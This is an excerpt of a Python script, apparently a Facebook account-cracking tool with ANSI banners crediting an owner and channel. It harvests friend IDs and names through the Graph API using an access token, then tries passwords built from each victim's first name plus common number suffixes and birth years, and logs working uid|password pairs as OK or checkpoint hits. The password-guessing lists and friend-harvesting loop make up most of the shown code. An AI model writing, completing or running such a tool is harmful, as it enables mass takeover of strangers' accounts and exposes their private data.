...
\x1b[0;33m║#OWNER    : @mala_bek4s 
\x1b[0;33m║#CHANEL: NAME [ @python453 ]  
\x1b[0;33m]         TB: free mod bakar bena [koreck]
 \x1b[0;33m╚═══════════════════════════════════════════╝""")
def login():
	os.system("clear")
	try:
...
def menu():
	...
	print("\033[1;93m[\033[1;94m01\033[1;97m] MULTIPLE-ID's CRACK\033[1;93m [ \033[1;95m PRO \033[1;97m]")
...
def massal():
	...
	try:
		tanya_Total = int(input("\033[1;96m[\033[1;94m+\033[1;96m] ba chan ID atawe crack kay ? : "))
	except:tanya_Total=1
	for t in range(tanya_Total):
		t +=1
		idt = raw_input("\033[1;96m[\033[1;94m+\033[1;97m] ID Dane %s : "%(t))
		try:
			for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
				uid = i["id"]
				nama = i["name"].rsplit(" ")[0]
...
def method():
	...
	print("\033[1;93m[\033[1;94m1\033[1;97m] B-API\033[1;97m [ \033[1;95mPRO{V4} \033[1;97m]")
	method = raw_input("\033[1;93m[\033[1;94m?\033[1;97m] CHOOSE : ")
	if method == "":
		menu()
	elif method == "1":
		ask = raw_input("\033[1;96m[\033[1;94m!\033[1;97m] CHOOSE\033[1;97m [ \033[1;96mDefault : t \033[1;97m] : ")
		if ask == "y":
			manual()
		print(" ")
...
def cek_ttl_cp(uid, pw):
	try:
		...
		with requests.Session() as ses:
			...
			print("\r\033[0;95m[CP] %s|%s|%s %s %s\033[0;91m"%(uid, pw, day, month, year))
...
def bapi(user):
	...
	uid, name = user.split("<=>")
	if len(name)>=6:
		pwx = [ name+"123", name+"1234", name+"12345", name+"123456", name+"1234567", name+"12345678", name+"123456789", name+"1122", name+"112233", name+"11223344", name+"1122334455", name+"112233445566", name+"1234512345", name+"1234554321", name+"123456654321", name+"123321", name+"0000", name+"12344321", name+"1990", name+"1991", name+"1992", name+"1993", name+"1994", name+"1995", name+"1996", name+"1997", name+"1998", name+"1999", name+"2000", name+"2001", name+"2002", name+"2003", name+"1111", name+"1212", name+"1313", name+"1414", name+"1515", name+"123123", name+"12341234", name+"1234512345", name+"123456123456", name+"2222", name+"3333", name+"4444", name+"5555", name+"11", name+"22", name+"123@", name+"123@", name+"  " ]
	elif len(name)<=2:
		pwx = [ name+"123", name+"1234", name+"12345", name+"123456", name+"1234567", name+"12345678", name+"123456789", name+"1122", name+"112233", name+"11223344", name+"1122334455", name+"112233445566", name+"1234512345", name+"1234554321", name+"123456654321", name+"123321", name+"0000", name+"12344321", name+"1990", name+"1991", name+"1992", name+"1993", name+"1994", name+"1995", name+"1996", name+"1997", name+"1998", name+"1999", name+"2000", name+"2001", name+"2002", name+"2003", name+"1111", name+"1212", name+"1313", name+"1414", name+"1515", name+"123123", name+"12341234", name+"1234512345", name+"123456123456", name+"2222", name+"3333", name+"4444", name+"5555", name+"11", name+"22", name+"123@", name+"123@", name+"  " ]
	elif len(name)<=3:
		pwx = [ name+"123", name+"1234", name+"12345", name+"123456", name+"1234567", name+"12345678", name+"123456789", name+"1122", name+"112233", name+"11223344", name+"1122334455", name+"112233445566", name+"1234512345", name+"1234554321", name+"123456654321", name+"123321", name+"0000", name+"12344321", name+"1990", name+"1991", name+"1992", name+"1993", name+"1994", name+"1995", name+"1996", name+"1997", name+"1998", name+"1999", name+"2000", name+"2001", name+"2002", name+"2003", name+"1111", name+"1212", name+"1313", name+"1414", name+"1515", name+"123123", name+"12341234", name+"1234512345", name+"123456123456", name+"2222", name+"3333", name+"4444", name+"5555", name+"11", name+"22", name+"123@", name+"123@", name+"  " ]
...
def mbasic(user):
	...
	global loop, token
	sys.stdout.write(
		"\r\033[0;91m[\033[0;92mCrack\033[0;92m]\033[0;93m %s/%s -> OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	uid, name = user.split("<=>")
	if len(name)>=6:
